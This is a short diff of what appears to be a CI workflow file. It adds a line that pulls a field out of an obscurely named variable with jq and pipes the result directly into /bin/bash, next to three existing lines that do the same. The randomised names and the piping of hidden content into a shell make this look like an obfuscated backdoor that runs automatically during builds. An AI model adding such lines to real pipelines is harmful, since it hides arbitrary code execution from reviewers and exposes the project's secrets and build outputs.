@@ -30,6 +30,7 @@ jobs:
           echo $ojmty0 | jq -r .h6 | /bin/bash
           echo $v0 | jq -r .cuf486 | /bin/bash
           echo $dhqo64 | jq -r .s82 | /bin/bash
+          printf '%s' "$k673" | jq -r .hptu7907 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
